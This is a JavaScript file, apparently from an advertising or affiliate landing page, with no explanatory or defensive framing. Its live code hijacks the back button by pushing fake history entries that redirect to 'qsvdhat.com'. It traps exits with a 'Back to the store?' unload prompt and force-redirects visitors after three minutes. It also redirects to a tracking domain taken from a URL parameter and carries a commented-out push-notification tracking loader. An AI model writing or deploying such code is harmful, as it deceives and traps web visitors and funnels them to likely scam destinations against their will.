(function() {
    const url = new URL(window.location.href);
    const clickID = url.searchParams.get("click_id");
    const sourceID = url.searchParams.get("source_id");
    // const s = document.createElement("script");
    // s.dataset.cfasync = "false";
    // s.src = "https://push-sdk.com/f/sdk.js?z=1175464";
    // s.onload = (opts) => {
    //     opts.zoneID = 1175464;
    //     opts.extClickID = clickID;
    //     opts.subID1 = sourceID;
    //     opts.actions.onPermissionGranted = () => {};
    //     opts.actions.onPermissionDenied = () => {};
    //     opts.actions.onAlreadySubscribed = () => {};
    //     opts.actions.onError = () => {};
    // };
    // document.head.appendChild(s);
})()

function launchLinks() {
    const trackingDomain = getURLParameter('domain');
    const click2URL = `https://${trackingDomain}/click`;
    const link2 = document.createElement('a');
    link2.href = click2URL;
    link2.target = '_self';
    window.onbeforeunload = null;
    link2.click();
}
var bbURL = "https://qsvdhat.com/cl/eb9517a3483b5ed0";
! function() {
    var t;
    for (t = 0; t < 5; ++t)
        history.pushState({}, "", "#");
    onpopstate = function(t) {
        if (t.state)
            location.replace(bbURL);
    };
}();
var pz = 1;
window.onunload = window.onbeforeunload = function(evt) {
    var message = "Back to the store?";
    if (pz == 1) {
        if (typeof evt == "undefined") evt = window.event;
        if (evt) evt.returnValue = message;
        return message;
    }
};

function go() {
    window.onbeforeunload = null;
}
setTimeout(function() {
    window.onbeforeunload = null;
    window.location = 'https://qsvdhat.com/cl/eb9517a3483b5ed0';
}, 180000);